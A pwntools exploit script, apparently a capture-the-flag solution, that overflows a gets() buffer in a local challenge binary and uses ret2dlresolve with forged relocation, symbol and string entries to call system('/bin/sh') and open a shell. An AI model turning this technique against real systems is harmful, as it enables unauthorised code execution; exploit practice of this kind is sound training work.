#!/usr/bin/python3
from pwn import *
gs = '''
b main
continue
'''
elf = context.binary = ELF('./chal')
context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-hp', '70']

def start():
    if args.GDB:
        return gdb.debug('./chal', gdbscript=gs)
    if args.REMOTE:
        return remote('127.0.0.1', 5555)
    else:
        return process('./chal')
r = start()
#========= exploit here ===================
ret = 0x0000000000401000
bss = 0x404000
SYMTAB = 0x4003e0
STRTAB = 0x400470
Versym = 0x4004f4
JMPREL = 0x400590
ElfSym_addr = 0x404e08
ElfRel_addr = 0x404e20
Symbol_name_addr = 0x404e00
Version_index_addr = 0x400b22
Data_addr = 0x404e00
PLT_INIT = 0x401020
PLT = 0x401020
RW_AREA = 0x404000  + 0x700

def align(addr):
    return (0x18 - (addr) % 0x18)


offset = 0xd
gets = elf.plt['gets']
main = elf.symbols['main']

# Fake .rela.plt
fake_relaplt = RW_AREA + 0x20 # Right after reloc_arg
fake_relaplt += align(fake_relaplt - JMPREL) # Alignment in x64 is 0x18
reloc_arg = int((fake_relaplt - JMPREL) / 0x18)

# Fake .symtab
fake_symtab = fake_relaplt + 0x18
fake_symtab += align(fake_symtab - SYMTAB) # Alignment in x64 is 0x18
r_info = (int((fake_symtab - SYMTAB) / 0x18) << 32) | 0x7 # | 0x7 to bypass check 4.


# Fake .strtab
fake_symstr = fake_symtab + 0x18
st_name = fake_symstr - STRTAB
bin_sh = fake_symstr + 0x8

#0x000000000040112e <+8>:     lea    rax,[rbp-0xd]

set_rdi = 0x000000000040112e


#some test

#rop = ROP(elf)
#rop.call(0x401020, [0x404768])
#log.info(rop.dump())
#pause()

#some test
### Sending
# writing to RW area RW_AREA+0xd
payload = b"A"*0xd
payload += p64(RW_AREA)
payload += p64(ret)
payload += p64(set_rdi)
r.sendline(payload)

# We send the payload containing the fake structures
stage2 = b"A"*0xd 
stage2 += p64(set_rdi) + p64(elf.sym._start)
stage2 += p64(PLT)
stage2 += p64(reloc_arg)

# Fake Elf64_Rel
stage2 += p64(elf.got.gets) #r_offset
stage2 += p64(r_info) #r_info

# Align
stage2 += p64(0)*3

# Fake Elf64_Sym
stage2 += p32(st_name)
stage2 += p8(0x12) # st_info,
stage2 += p8(0)  # st_other -> 0x00, bypass check .5
stage2 += p16(0) # st_shndx
stage2 += p64(0) # st_value
stage2 += p64(0) # st_size

# Fake strings
stage2 += b"system\x00\x00"
stage2 += b"/bin/sh\x00"
stage2 += p64(ret)
stage2 += p64(ret)
stage2 += p64(ret)
stage2 += p64(PLT)
stage2 += p64(reloc_arg)
stage2 += p64(0xdeadbeef)

r.sendline(stage2)




#sleep(0.1)


payload = b"Y"*0xd
payload += p64(0x404768)
payload += p64(set_rdi)
r.sendline(payload)

r.sendline(b"\x00")






#========= interactive ====================
r.interactive()



'''
[DEBUG] Symtab: 0x4003e0
[DEBUG] Strtab: 0x400470
[DEBUG] Versym: 0x4004f4
[DEBUG] Jmprel: 0x400590
[DEBUG] ElfSym addr: 0x404e08
[DEBUG] ElfRel addr: 0x404e20
[DEBUG] Symbol name addr: 0x404e00
[DEBUG] Version index addr: 0x400b22
[DEBUG] Data addr: 0x404e00
[DEBUG] PLT_INIT: 0x401020
'''